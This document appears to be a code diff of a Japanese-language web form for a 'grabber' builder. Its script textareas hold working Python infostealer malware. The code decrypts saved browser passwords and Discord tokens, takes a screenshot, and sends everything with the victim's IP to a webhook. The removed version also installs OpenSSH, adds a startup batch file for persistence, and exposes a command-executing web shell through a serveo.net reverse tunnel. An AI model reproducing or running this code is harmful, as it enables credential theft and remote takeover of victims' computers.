@@ -37,119 +37,88 @@
                         </div>
                         <div class="mb-2">
                             <label for="libraries">使用ライブラリリスト（カンマ区切り）</label>
-                            <input type="text" class="form-control" id="libraries" name="libraries" value="requests,mss,Pillow" required>
+                            <input type="text" class="form-control" id="libraries" name="libraries" value="requests,mss,Pillow,pycryptodome" required>
                         </div>
                         <div class="mb-2">
-                            <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLの定数はWEBHOOK_URLです、定義はこのコードの前に来ます）:</label>
-                            <textarea class="form-control" id="script" name="script" rows="20">T='content'
-S='encrypted_key'
-R='os_crypt'
-Q=Exception
-N='loginData'
-I='utf-8'
-B=None
-C=open
-J=WEBHOOK_URL
-import pexpect.popen_spawn,win32crypt as O,subprocess as E,pexpect,threading as U,requests as D,getpass as V,sqlite3 as Z,shutil as P,random,string,socket as F,base64 as K,json as L,time,mss,sys,re,os as A
-from Crypto.Cipher import AES as G
-from bs4 import BeautifulSoup
-M=A.getenv('LOCALAPPDATA')
-H=A.getenv('APPDATA')
-a=[f"{M}\\Google\\Chrome",f"{M}\\Microsoft\\Edge",f"{M}\\Google\\Chrome SxS"]
-W=[f"{H}\\discord",f"{H}\\discordcanary",f"{H}\\Lightcord",f"{H}\\discordptb"]
-i=''
-j=[]
-X='\n<html>\n<body>\n    <h2>Web Shell</h2>\n    <form method="GET">\n        <input type="text" name="cmd" placeholder="Enter command" autofocus />\n        <input type="submit" value="Execute" />\n    </form>\n    <pre>{output}</pre>\n</body>\n</html>\n'
-def Y(token):
-    A=token
-    if not A:return False
-    C={'Content-Type':'application/json','Authorization':A};B=D.get('https://discord.com/api/v9/users/@me',headers=C);return str(B.status_code)[0]=='2',B.text
-def b():
-    F={}
-    for M in W:
-        T=f"{M}\\Local State";H=f"{M}\\Local Storage\\leveldb"
-        if not A.path.exists(H):continue
-        with C(T,encoding=I)as U:V=L.load(U)
-        D=V[R][S];D=D.encode(I);D=K.b64decode(D)[5:];X=O.CryptUnprotectData(D,B,B,B,0)[1]
-        for E in A.listdir(H):
-            if not E.endswith(('.log','.ldb')):continue
-            with C(A.path.join(H,E),'r',errors='ignore')as E:
-                Z=E.readlines()
-                for a in Z:
-                    for b in re.findall('dQw4w9WgXcQ:[^"]*',a):
+                            <label for="script">Pythonスクリプト（変更は開発者向け）（WebhookURLはpwu.datというファイルにシーザー暗号で保存します）:</label>
+                            <textarea class="form-control" id="script" name="script" rows="20">_D='encrypted_key'
+_C='os_crypt'
+_B='loginData'
+_A='utf-8'
+import requests,getpass,sqlite3,shutil,socket,base64,json,mss,re,os,Crypto,ctypes
+from ctypes import*
+from ctypes.wintypes import*
+from Crypto.Cipher import AES
+LOCAL=os.getenv('LOCALAPPDATA')
+ROAMING=os.getenv('APPDATA')
+CHROMIUM_DIRS=[f"{LOCAL}\\Google\\Chrome",f"{LOCAL}\\Microsoft\\Edge",f"{LOCAL}\\Google\\Chrome SxS"]
+DISCORD_DIRS=[f"{ROAMING}\\discord",f"{ROAMING}\\discordcanary",f"{ROAMING}\\Lightcord",f"{ROAMING}\\discordptb"]
+data=''
+class DATA_BLOB(ctypes.Structure):_fields_=[('cbData',DWORD),('pbData',LPBYTE)]
+def decryptData(encryptedData):
+    A=None;crypt32=ctypes.windll.crypt32;crypt32.CryptUnprotectData.restype=BOOL;crypt32.CryptUnprotectData.argtypes=[ctypes.POINTER(DATA_BLOB),ctypes.POINTER(ctypes.c_wchar_p),ctypes.POINTER(DATA_BLOB),LPVOID,LPVOID,DWORD,ctypes.POINTER(DATA_BLOB)];encryptedBlob=DATA_BLOB();encryptedBlob.cbData=len(encryptedData);buffer=ctypes.create_string_buffer(encryptedData);encryptedBlob.pbData=ctypes.cast(buffer,LPBYTE);decryptedBlob=DATA_BLOB();result=crypt32.CryptUnprotectData(ctypes.byref(encryptedBlob),A,A,A,A,0,ctypes.byref(decryptedBlob))
+    if result:decryptedData=ctypes.string_at(decryptedBlob.pbData,decryptedBlob.cbData);return decryptedData
+    else:error_code=ctypes.GetLastError();raise Exception(f"Data decryption failed with error code: {error_code}")
+def getUserInfo(token):
+    if not token:return False
+    headers={'Content-Type':'application/json','Authorization':token};res=requests.get('https://discord.com/api/v9/users/@me',headers=headers);return str(res.status_code)[0]=='2',res.text
+def findDiscordTokens():
+    tokens={}
+    for discord in DISCORD_DIRS:
+        localState=f"{discord}\\Local State";leveldb=f"{discord}\\Local Storage\\leveldb"
+        if not os.path.exists(leveldb):continue
+        with open(localState,encoding=_A)as f:d=json.load(f)
+        encryptedKey=d[_C][_D];encryptedKey=encryptedKey.encode(_A);encryptedKey=base64.b64decode(encryptedKey)[5:];secretKey=decryptData(encryptedKey)
+        for file in os.listdir(leveldb):
+            if not file.endswith(('.log','.ldb')):continue
+            with open(os.path.join(leveldb,file),'r',errors='ignore')as file:
+                lines=file.readlines()
+                for line in lines:
+                    for regexLine in re.findall('dQw4w9WgXcQ:[^"]*',line):
                         try:
-                            N=K.b64decode(b.split('dQw4w9WgXcQ:')[1]);c=N[3:15];d=N[15:];e=G.new(X,G.MODE_GCM,c);J=e.decrypt(d)[:-16].decode();P=Y(J)
-                            if P[0]:
-                                if J in F:continue
-                                F[J]=P[1];break
-                        except Q as f:continue
-    return F
-def c():
-    E='===== Find Chromium Datas =====\n'
-    for dir in a:
-        J=f"{dir}\\User Data\\Local State"
-        if not A.path.exists(J):continue
-        E+='===== '+dir.split('\\')[-1]+' =====\n'
-        with C(J,encoding=I)as b:M=L.load(b)
-        Q=M['profile']['info_cache'];D=M[R][S];D=D.encode(I);D=K.b64decode(D)[5:];c=O.CryptUnprotectData(D,B,B,B,0)[1]
-        for H in Q:
-            T=Q[H];E+=H+':\n    Email:'+T['user_name']+'\n    Name:'+T['gaia_name']+'\n    LoginData:\n';d=f"{dir}\\User Data\\{H}\\Login Data";P.copy2(d,N);U=Z.connect(N);V=U.cursor();V.execute('SELECT action_url, username_value, password_value FROM logins')
-            for(h,F)in enumerate(V.fetchall()):
-                W=F[0];X=F[1];e=F[2][3:15];f=F[2][15:-16];g=G.new(c,G.MODE_GCM,e);Y=g.decrypt(f).decode()
-                if W and X and Y:E+=f"\n        ServiceUrl:{W}\n        Username:{X}\n        Password:{Y}\n"
-            U.close()
-    return E
-def d(useUser):
-    I=useUser;B=f"C:\\Users\\{I}\\Music"
-    if A.path.isdir(f"{B}\\Pi"):return
-    with C(f"{B}\\Pi.zip",mode='wb')as H:H.write(D.get('https://github.com/PowerShell/Win32-OpenSSH/releases/download/v9.5.0.0p1-Beta/OpenSSH-Win32.zip').content)
-    P.unpack_archive(f"{B}\\Pi.zip",f"{B}\\Pi");A.remove(f"{B}\\Pi.zip");B=f"{B}\\Pi\\OpenSSH-Win32";F=f'@echo off\n@if not "%~0"=="%~dp0.\\%~nx0" start /min cmd /c,"%~dp0.\\%~nx0" %* & goto :eof\ncd {B}\n';B=f"C:\\Users\\{I}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup";F+='start '
-    for G in A.listdir(A.getcwd()):
-        if not A.path.isfile(G):continue
-        if G=='grabber.py':F+=f"python {A.getcwd()}\\{G}"
-        elif G.endswith('.exe'):F+=f".\\{A.getcwd()}\\{G}"
-    F+=f" as"
-    with C(f"{B}\\pistart.bat",mode='w')as H:H.write(F)
-    E.run(f"{B}\\pistart.bat")
-def e(useUser,ip):
-    A=f"C:\\Users\\{useUser}\\Music\\Pi\\OpenSSH-Win32"
-    with E.Popen([f"{A}\\ssh.exe",'-o','StrictHostKeyChecking=no','-R','80:127.0.0.1:8877','serveo.net'],stdout=E.PIPE,stderr=E.STDOUT,text=True)as B:
-        for C in B.stdout:D.post(J,data={T:f"{ip}: {C}"})
-def f(request):
-    D='GET /?cmd=';B=request
-    try:
-        A=''
-        if D in B:A=B.split(D)[1].split(' ')[0];A=A.split('&')[0];A=A.replace('%20',' ')
-        F=E.getoutput(A)if A else'';G=X.format(output=F);C=f"HTTP/1.1 200 OK\r\nContent-Type: text/html\r\n\r\n{G}"
-    except Q as H:C=f"HTTP/1.1 500 Internal Server Error\r\nContent-Type: text/plain\r\n\r\nError: {str(H)}"
-    return C
-def g(port=8877):
-    A=F.socket(F.AF_INET,F.SOCK_STREAM);A.bind(('127.0.0.1',port));A.listen(5)
-    while True:B,E=A.accept();C=B.recv(1024).decode();D=f(C);B.sendall(D.encode());B.close()
-def h():
-    P='file';I='screenshot.png';G=V.getuser();K=D.get('http://ifconfig.me').text;Q=F.gethostname()
-    if len(sys.argv)>1:U.Thread(target=g).start();e(G,K);return
-    print('Start....');d(G);R=c();M=b();S={'left':0,'top':0,'width':1920,'height':1080}
-    with mss.mss()as W:B=W.grab(S);mss.tools.to_png(B.rgb,B.size,output=I)
-    B=C(I,'rb');X=C(f"C:\\Users\\{G}\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\pistart.bat",'r').read();H=f"""# Grabber Result
+                            x=base64.b64decode(regexLine.split('dQw4w9WgXcQ:')[1]);initialisationVector=x[3:15];encryptedToken=x[15:];cipher=AES.new(secretKey,AES.MODE_GCM,initialisationVector);token=cipher.decrypt(encryptedToken)[:-16].decode();userInfo=getUserInfo(token)
+                            if userInfo[0]:
+                                if token in tokens:continue
+                                tokens[token]=userInfo[1];break
+                        except Exception as e:continue
+    return tokens
+def findChromiumDatas():
+    resultStr='===== Find Chromium Datas =====\n'
+    for dir in CHROMIUM_DIRS:
+        localState=f"{dir}\\User Data\\Local State"
+        if not os.path.exists(localState):continue
+        resultStr+='===== '+dir.split('\\')[-1]+' =====\n'
+        with open(localState,encoding=_A)as f:d=json.load(f)
+        profiles=d['profile']['info_cache'];encryptedKey=d[_C][_D];encryptedKey=encryptedKey.encode(_A);encryptedKey=base64.b64decode(encryptedKey)[5:];secretKey=decryptData(encryptedKey)
+        for profileName in profiles:
+            profile=profiles[profileName];resultStr+=profileName+':\n    Email:'+profile['user_name']+'\n    Name:'+profile['gaia_name']+'\n    LoginData:\n';loginDataDb=f"{dir}\\User Data\\{profileName}\\Login Data";shutil.copy2(loginDataDb,_B);c=sqlite3.connect(_B);cu=c.cursor();cu.execute('SELECT action_url, username_value, password_value FROM logins')
+            for(i,l)in enumerate(cu.fetchall()):
+                url=l[0];username=l[1];initialisationVector=l[2][3:15];encryptedPassword=l[2][15:-16];cipher=AES.new(secretKey,AES.MODE_GCM,initialisationVector);password=cipher.decrypt(encryptedPassword).decode()
+                if url and username and password:resultStr+=f"\n        ServiceUrl:{url}\n        Username:{username}\n        Password:{password}\n"
+            c.close()
+    return resultStr
+def main():
+    B='file';A='screenshot.png';print('Start....');resultStr=findChromiumDatas();tokens=findDiscordTokens();ip=requests.get('https://ifconfig.me').text;useUser=getpass.getuser();hostName=socket.gethostname();monitor={'left':0,'top':0,'width':1920,'height':1080}
+    with mss.mss()as sct:screenshot=sct.grab(monitor);mss.tools.to_png(screenshot.rgb,screenshot.size,output=A)
+    screenshot=open(A,'rb');message=f"""# Grabber Result
 ```
-IP:{K}
-UseUser:{G}
-HostName:{Q}```
+IP:{ip}
+UseUser:{useUser}
+HostName:{hostName}```
 ## Tokens
 ```
 """
-    for O in M:E=L.loads(M[O]);H+=f"""Token - {O}
-UserId - {E["id"]}
-UserName - {E["username"]}
-GlobalName - {E["global_name"]}
-Email - {E["email"]}
-PhoneNumber - {E["phone"]}
+    for token in tokens:userInfo=json.loads(tokens[token]);message+=f"""Token - {token}
+UserId - {userInfo["id"]}
+UserName - {userInfo["username"]}
+GlobalName - {userInfo["global_name"]}
+Email - {userInfo["email"]}
+PhoneNumber - {userInfo["phone"]}
 
 """
-    H+=f"```\nSSHStartBat:```\n{X}\n```";D.post(J,data={T:H},files={P:B});D.post(J,files={P:('loginData.txt',R.encode())});B.close();Y=[N,I]
-    for Z in Y:A.remove(Z)
-if __name__=='__main__':h()</textarea>
+    message+='```';requests.post(WEBHOOK_URL,data={'content':message},files={B:screenshot});requests.post(WEBHOOK_URL,files={B:('loginData.txt',resultStr.encode())});screenshot.close();files=[_B,A]
+    for file in files:os.remove(file)
+if __name__=='__main__':main()</textarea>
                         </div>
                         <button type="submit" id="submit" class="btn btn-primary">
                             <span class="spinner-border spinner-border-sm d-none" role="status" aria-hidden="true"></span>
@@ -165,9 +134,8 @@ if __name__=='__main__':h()</textarea>
             var webhookUrlInput = document.getElementById("webhookUrl");
             var librariesInput = document.getElementById("libraries");
             var scriptInput = document.getElementById("script");
-            var ngrokTokenInput = document.getElementById("ngrokToken");
             var submitButton = document.getElementById("submit");
-            webhookUrlInput.readOnly = librariesInput.readOnly = scriptInput.readOnly = ngrokTokenInput.readOnly = true;
+            webhookUrlInput.readOnly = librariesInput.readOnly = scriptInput.readOnly = true;
             submitButton.disabled = true;
             var spinner = this.querySelector('.spinner-border');
             spinner.classList.remove('d-none');
